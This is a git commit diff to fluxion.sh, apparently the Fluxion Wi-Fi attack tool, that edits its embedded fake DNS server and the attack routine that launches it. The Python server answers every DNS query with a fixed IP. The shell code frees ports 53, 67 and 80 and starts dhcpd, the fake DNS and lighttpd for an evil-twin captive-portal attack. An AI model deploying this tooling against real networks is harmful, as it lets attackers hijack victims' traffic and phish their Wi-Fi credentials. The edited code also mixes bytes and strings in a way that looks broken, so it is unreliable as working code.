b580db58793b00d38510416d94bef11c1d9ef266
zexceed12300 <zexceed12300>
2020-07-15 15:00:03 +0000

    fakedns: fixed-unreacable-address

--- fluxion.sh
+++ fluxion.sh
@@ -1984,28 +1984,32 @@ class DNSQuery:
     self.dominio=''
 
     tipo = (ord(data[2]) >> 3) & 15
-    if tipo == 0:
+    if(tipo == 0):
       ini=12
       lon=ord(data[ini])
-      while lon != 0:
+      while(lon != 0):
         self.dominio+=data[ini+1:ini+lon+1]+'.'
         ini+=lon+1
         lon=ord(data[ini])
 
   def respuesta(self, ip):
     packet=''
-    if self.dominio:
-      packet+=self.data[:2] + \"\x81\x80\"
-      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
-      packet+=self.data[12:]
-      packet+='\xc0\x0c'
-      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
-      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
+    if(self.dominio):
+      packet += self.data[:2]
+      packet += b'\x81\x80'
+      packet += self.data[4:6]
+      packet += self.data[4:6]
+      packet += b'\x00\x00\x00\x00'
+      packet += self.data[12:]
+      packet += b'\xc0\x0c'
+      packet += b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
+      packet += str.join('',map(lambda x: chr(int(x)), ip.split('.')))
     return packet
 
 if __name__ == '__main__':
-  ip='$IP'
-  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
+  ip='192.168.1.1'
+  print('pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip)
+  print('Fixed By zexceed12300') 
 
   udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   udps.bind(('',53))
@@ -2014,10 +2018,11 @@ if __name__ == '__main__':
     while 1:
       data, addr = udps.recvfrom(1024)
       p=DNSQuery(data)
-      udps.sendto(p.respuesta(ip), addr)
-      print 'Request: %s -> %s' % (p.dominio, ip)
+      ports = list(addr)
+      udps.sendto(p.respuesta(ip), ('192.168.1.1', ports[1]))
+      print('Request: %s -> %s' %(p.dominio, ip))
   except KeyboardInterrupt:
-    print 'Finalizando'
+    print('Final')
     udps.close()" > $DUMP_PATH/fakedns
         chmod +x $DUMP_PATH/fakedns
 }
@@ -2083,7 +2088,7 @@ function attack {
         fuser -n udp -k 53 67 80 &> $flux_output_device
 
         xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
-        xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
+        xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python2 $DUMP_PATH/fakedns &
 
         lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
 
